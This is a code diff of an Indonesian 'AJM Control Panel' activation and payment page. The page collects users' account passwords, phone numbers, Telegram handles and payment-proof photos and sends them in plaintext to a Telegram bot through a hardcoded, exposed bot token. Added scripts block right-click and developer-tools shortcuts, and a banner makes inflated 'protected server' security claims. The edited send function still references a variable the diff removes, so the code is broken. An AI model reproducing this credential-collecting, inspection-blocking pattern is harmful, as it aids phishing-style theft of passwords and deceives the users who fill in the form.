@@ -110,11 +110,14 @@
         }
 
         /* Activation Card & Form */
-        .activation-card {
-            padding: 30px; border-radius: 35px;
-            background: linear-gradient(145deg, rgba(255,255,255,0.03), transparent);
-            border: 1px solid var(--border); margin-bottom: 120px; backdrop-filter: blur(10px);
-        }
+.activation-card {
+    padding: 20px;
+    border-radius: 35px;
+    background: linear-gradient(145deg, rgba(255,255,255,0.03), transparent);
+    border: 1px solid var(--border);
+    margin-bottom: 30px;
+    backdrop-filter: blur(10px);
+}
 
         .input-group { margin-bottom: 15px; text-align: left; }
         .input-group label { display: block; font-size: 11px; color: #888; margin-bottom: 5px; text-transform: uppercase; font-weight: 600; }
@@ -139,20 +142,7 @@
             box-shadow: 0 10px 30px rgba(0, 136, 204, 0.2);
         }
         .btn-tele:disabled { opacity: 0.3; cursor: not-allowed; filter: grayscale(1); }
-
-        /* Delay Timer Styling */
-        #delayTimer {
-            display: none;
-            margin-top: 20px;
-            padding: 20px;
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 18px;
-            border: 1px solid var(--border);
-            text-align: center;
-        }
-        .timer-text { font-size: 11px; color: #888; text-transform: uppercase; margin-bottom: 5px; letter-spacing: 1px; }
-        .timer-clock { font-family: 'JetBrains Mono'; font-size: 24px; color: var(--primary); font-weight: 800; }
-
+        
         .btn-wa {
             width: 100%; padding: 20px; border-radius: 18px; border: none;
             background: #25d366; color: #fff; font-size: 15px; font-weight: 800;
@@ -172,7 +162,76 @@
         }
         .nav-link { color: rgba(255,255,255,0.3); font-size: 22px; text-decoration: none; transition: 0.3s; }
         .nav-link.active { color: var(--primary); filter: drop-shadow(0 0 8px var(--primary)); }
+        .security-footer{
+margin-top:40px;
+padding:30px 25px;
+border-radius:25px;
+background:rgba(255,62,62,0.05);
+border:1px solid rgba(255,62,62,0.3);
+text-align:center;
+position:relative;
+overflow:hidden;
+}
 
+.security-footer::before{
+content:"";
+position:absolute;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:linear-gradient(120deg,transparent,rgba(255,0,0,0.1),transparent);
+animation:scan 6s linear infinite;
+}
+
+@keyframes scan{
+0%{transform:translateX(-100%)}
+100%{transform:translateX(100%)}
+}
+
+.security-title{
+font-size:13px;
+letter-spacing:2px;
+color:#ff3e3e;
+margin-bottom:12px;
+font-family:'JetBrains Mono';
+font-weight:800;
+text-transform:uppercase;
+}
+
+.security-text{
+font-size:11.5px;
+line-height:1.7;
+color:rgba(255,255,255,0.75);
+margin-bottom:12px;
+}
+
+.security-dev{
+margin-top:15px;
+padding:14px;
+border-radius:14px;
+background:rgba(0,0,0,0.4);
+border:1px solid rgba(255,255,255,0.08);
+font-size:12px;
+}
+
+.security-dev a{
+color:#00f2fe;
+text-decoration:none;
+font-weight:700;
+}
+
+.security-dev a:hover{
+text-decoration:underline;
+}
+
+.security-watermark{
+margin-top:15px;
+font-size:10px;
+letter-spacing:2px;
+color:rgba(255,255,255,0.3);
+font-family:'JetBrains Mono';
+}
     </style>
 </head>
 <body oncontextmenu="return false;" onkeydown="return disableSecurity(event);">
@@ -230,33 +289,51 @@
                     <input type="tel" id="telePhone" placeholder="08xxxxxxxx" oninput="checkForm()">
                 </div>
                 <div class="input-group">
+                  <label>Username Telegram</label>
+                  <input type="text" id="teleTelegram" placeholder="@username_telegram" oninput="checkForm()">
+                </div>
+                <div class="input-group">
                     <label>Bukti Pembayaran (Foto)</label>
                     <label for="proofUpload" class="file-label" id="fileText">📎 UPLOAD BUKTI TRANSFER</label>
                     <input type="file" id="proofUpload" style="display:none;" accept="image/*" onchange="handleFile()">
                 </div>
 
                 <button class="btn-tele" id="btnTele" disabled onclick="sendToTelegram()">
-                    🚀 KIRIM KE WHATSAPP RESMI
+                    🚀 KIRIM KE BOT RESELLER
                 </button>
 
-                <div id="delayTimer">
-                    <div class="timer-text">Menunggu Sinkronisasi Enkripsi...</div>
-                    <div class="timer-clock" id="clock">10:00</div>
-                </div>
-
-                <button class="btn-wa" id="btnWA" onclick="confirmWA()">
-                    ✅ KONFIRMASI KE WHATSAPP
+                <button class="btn-wa" id="btnWA" onclick="confirmTelegram()">
+                  ✅ KONFIRMASI KE TELEGRAM
                 </button>
             </div>
         </div>
     </div>
 </div>
-
-<nav class="nav-dock">
-    <a href="#" class="nav-link active">⦿</a>
-    <a href="#" class="nav-link">◈</a>
-    <a href="#" class="nav-link">⬡</a>
-</nav>
+<div class="security-footer">
+<div class="security-title">
+⚠️ ANTI PENIPUAN • ANTI SCAM • ANTI RIP
+</div>
+<div class="security-text">
+Sistem <b>AJM CONTROL PANEL</b> merupakan platform resmi yang dilindungi oleh sistem keamanan digital.
+Segala bentuk peniruan website, cloning aplikasi, ataupun penjualan melalui pihak ketiga
+<b>bukan merupakan bagian dari layanan resmi kami.</b>
+</div>
+<div class="security-text">
+Jika anda menemukan pihak yang meniru sistem ini,
+menggunakan nama AJM, atau menawarkan layanan yang sama
+dapat dipastikan itu adalah <b>SCAM / PENIPUAN</b>.
+</div>
+<div class="security-dev">
+Laporkan aktivitas mencurigakan ke Developer Resmi:<br><br>
+Telegram Developer<br>
+<a href="https://t.me/share/url?url=&text=Halo%20admin%2C%20saya%20dapat%20informasi%20dari%20akun%20Telegram%20dengan%20username%20%40Aldinugroho378.%20Apakah%20akun%20tersebut%20adalah%20member%20reseller%20yang%20resmi%3F" target="_blank">
+@DeveloperAJM
+</a>
+</div>
+<div class="security-watermark">
+AJM SECURITY SYSTEM • PROTECTED SERVER
+</div>
+</div>
 
 <script>
     function disableSecurity(e) {
@@ -285,9 +362,13 @@
     }
 
     function checkForm() {
-        const u = document.getElementById('teleUser').value, p = document.getElementById('telePass').value, n = document.getElementById('telePhone').value, f = document.getElementById('proofUpload').files[0];
-        document.getElementById('btnTele').disabled = !(u && p && n && f);
-    }
+      const u = document.getElementById('teleUser').value;
+      const p = document.getElementById('telePass').value;
+      const n = document.getElementById('telePhone').value;
+      const t = document.getElementById('teleTelegram').value;
+      const f = document.getElementById('proofUpload').files[0];
+      document.getElementById('btnTele').disabled = !(u && p && n && t && f);
+}
 
     async function sendToTelegram() {
         const token = "7991098911:AAH3YjGTrgSOjwHIAOyB882grVz7XGwiyls"; // GANTI TOKEN
@@ -297,7 +378,7 @@
         const planName = planElement.options[planElement.selectedIndex].text;
         const user = document.getElementById('teleUser').value;
         const pass = document.getElementById('telePass').value;
-        const phone = document.getElementById('telePhone').value;
+        const telegram = document.getElementById('teleTelegram').value;
         const file = document.getElementById('proofUpload').files[0];
 
         const btn = document.getElementById('btnTele');
@@ -307,16 +388,21 @@
         const formData = new FormData();
         formData.append('chat_id', chatId);
         formData.append('photo', file);
-        formData.append('caption', `📊 *AKTIVASI BARU*\n💎 *PAKET:* ${planName}\n👤 *USER:* ${user}\n🔑 *PASS:* ${pass}\n📱 *WA:* ${phone}`);
+        formData.append('caption', `📊 *AKTIVASI BARU*
+        💎 *PAKET:* ${planName}
+        👤 *USER:* ${user}
+        🔑 *PASS:* ${pass}
+        📱 *WA:* ${phone}
+        ✈️ *TELEGRAM:* ${telegram}`);
         formData.append('parse_mode', 'Markdown');
 
         try {
             const response = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
             const result = await response.json();
             if (result.ok) {
-                alert("DATA TERKIRIM! Memulai sinkronisasi otomatis...");
-                btn.style.display = 'none';
-                startCountdown();
+              alert("DATA BERHASIL TERKIRIM KE SERVER AJM.");
+              btn.style.display = 'none';
+              document.getElementById('btnWA').style.display = 'block';
             } else {
                 alert("Gagal kirim.");
                 btn.disabled = false;
@@ -327,32 +413,52 @@
         }
     }
 
-    function startCountdown() {
-        const timerArea = document.getElementById('delayTimer');
-        const clock = document.getElementById('clock');
-        const btnWA = document.getElementById('btnWA');
-        timerArea.style.display = 'block';
+    function confirmTelegram() {
+      
+      const user = document.getElementById('teleUser').value;
+      const telegram = document.getElementById('teleTelegram').value;
+      const planElement = document.getElementById('planSelect');
+      const planName = planElement.options[planElement.selectedIndex].text;
+      const text = `Halo Admin AJM, Saya sudah melakukan pembayaran dan proses sinkronisasi sistem telah selesai.
+      
+      Berikut data aktivasi saya:
+      Username AJM : ${user}
+      Telegram : ${telegram}
+      Paket : ${planName}
+      
+      Mohon bantuan untuk:
+      • Mengirimkan aplikasi AJM Control Panel
+      • Menambahkan akun AJM saya ke sistem
+      • Mengaktifkan paket sesuai pembelian
+      
+      Terima kasih.`;
+  window.open(`https://t.me/Aldinugroho378?text=${encodeURIComponent(text)}`);
 
-        let time = 600; // 10 Menit dalam detik
-        const interval = setInterval(() => {
-            let mins = Math.floor(time / 60);
-            let secs = time % 60;
-            clock.innerText = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
-            
-            if (time <= 0) {
-                clearInterval(interval);
-                timerArea.style.display = 'none';
-                btnWA.style.display = 'block';
-            }
-            time--;
-        }, 1000);
-    }
+}
+    /* =========================
+ANTI INSPECT BASIC
+========================= */
 
-    function confirmWA() {
-        const u = document.getElementById('teleUser').value;
-        const text = `Halo Admin AJM, saya sudah melunasi pembayaran dan menunggu 10 menit sinkronisasi.%0A%0AUsername: ${u}%0AStatus: Sinkronisasi Selesai.`;
-        window.open(`https://wa.me/6283869335367?text=${text}`);
-    }
+document.addEventListener('contextmenu',event=>event.preventDefault());
+
+document.onkeydown=function(e){
+
+if(e.keyCode==123){return false}
+
+if(e.ctrlKey && e.shiftKey && e.keyCode==73){return false}
+
+if(e.ctrlKey && e.shiftKey && e.keyCode==74){return false}
+
+if(e.ctrlKey && e.keyCode==85){return false}
+
+}
+
+/* =========================
+ANTI CLONE WATERMARK
+========================= */
+
+console.log("%cSTOP!","color:red;font-size:40px;font-weight:bold;")
+console.log("%cAJM CONTROL PANEL SECURITY SYSTEM","color:#00f2fe;font-size:16px")
 </script>
 
 </body>
